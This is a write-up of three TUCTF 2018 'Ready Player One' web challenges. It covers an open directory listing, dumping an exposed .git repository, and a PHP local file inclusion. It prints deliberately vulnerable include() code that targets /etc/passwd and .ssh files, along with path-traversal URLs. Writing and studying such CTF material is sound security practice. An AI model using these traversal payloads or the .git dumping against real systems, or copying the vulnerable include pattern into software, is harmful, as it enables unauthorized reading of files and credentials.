TUCTF 2018 â€” "Easter egg" challenges
====================================

A series of three web challenges, themed around the book _Ready Player One_.

The Copper Gate
---------------

> How did I end up here? - Joker  
> http://18.191.227.167/

We see what looks like a "placeholder" page, with a video referencing the book embedded on the page. The text reads:

> Please return at a later date for more content!

Which I took to be a hint that I needed to somehow make a request "from the future" to get a different version of the page. In fact, it was much simpler: an image included on the page was stored in the `/images` directory.  
Navigating there, it turns out that directory listing is enabled, and there's a text file with instructions pointing us to "the development area":

http://18.191.227.167/devvvvv/home.html

> Welcome to the development area
> You may be asking yourself how you got here... Truth be told I have no idea either. You may want to figure that out.

> I hope you have as much fun solving this as I did writing it.

"An old direction" seems to point to a directory that we've already explored before. "Protected" made me think of `.htaccess`, but I got a 403 when trying to read it.

With "Preserve network logs" enabled in the Chrome dev console, I used the same trick as before and simply navigated up to `/devvvvv`, trying to see if we could get a directory listing.

Instead, `devvvvv/index.html` contained a `meta` tag redirecting us to `devvvvv/home.html`... but also a link to flag! (Base64 encoded)

The Jade Gate
-------------

Challenge description:

> Gotta make sure I log my changes. - Joker  
> http://18.191.227.167/

On the page where we found the copper flag, there were extra instructions:

> **The Jade Flag**
>
> The updates conceal the Jade Flag  
> in a backup long neglected  
> But you can only retrace your steps  
> once the logs are all collected  

Okay, so there are some evocative keywords there:

- "backup": perhaps a zip with the source code / database dump is stored somewhere
- "logs": server & access logs? PHP stores logs in a default location, so perhaps there's a directory traversal exploit that would allow us to get them. I tried for a little bit, but no luck.
- "log my changes": wait, that sounds a lot like version control!

http://18.191.227.167/.git/  
Bingo! We get the directory listing for a typical git repository. Let's download it for convenience:

```
wget -r http://18.191.227.167/.git/
```

Looking at the changes from each commit, after reading through a few funny / trollish messages, we find the Jade flag:

```
http://18.191.227.167/youfoundthejadegate/gate.html
TUCTF{S0_Th1s_D035n7_533m_l1k3_175_f41r_8u7_wh0_3v3r_s41d_l1f3_15_f41r?}
```

The Crystal Gate
-------------

> I don't wanna go anywhere.  
> http://18.191.227.167/

Continuing to analyze the Git repository's content, we see _staged_, but non-committed changes:

![Staged files in the git repo](jade-commits.png)

```
<?php
echo 'Note: Only used for access management and to check user info.';
echo '<br>';
echo 'Note2: I can\'t seem to remember the param. It\'s "file"';
echo '<br>';

if (isset($_GET['file'])) {
    $file = $_GET['file'];
    if (strpos($file, '/etc/passwd') == true) {
        include($file);
    }
    elseif (strpos($file, '.ssh') == true) {
        include($file);
        echo '<br>';
        echo 'Probably shouldn\'t put my own key in my own authorized keys, but oh well.';
    }
}
?>
```

That certainly looks exploitable!  
For one, `strpos` only checks that the substring is _somewhere_ in `$file`.  
After trying different values of `$file`, I realized that the code seen in the repo wasn't exactly what's running on the server. The exploit is even easier, allowing inclusion of _any_ file:

```
http://18.191.227.167/crystalsfordays/traversethebridge.php?file=..
http://18.191.227.167/crystalsfordays/traversethebridge.php?file=../..
http://18.191.227.167/crystalsfordays/traversethebridge.php?file=../../TheEgg.html
```

And we got the flag!

```
Note: Only used for access management and to check user info.
<br>Note2: I can't seem to remember the param. It's "file"

    <p>THE END</p>
    <p>Congratulations! You have discovered the crystal key and unlocked the egg. Thank you for your participation in this competition and I hope you enjoyed the trip, as well as learned a few things in the process.</p>
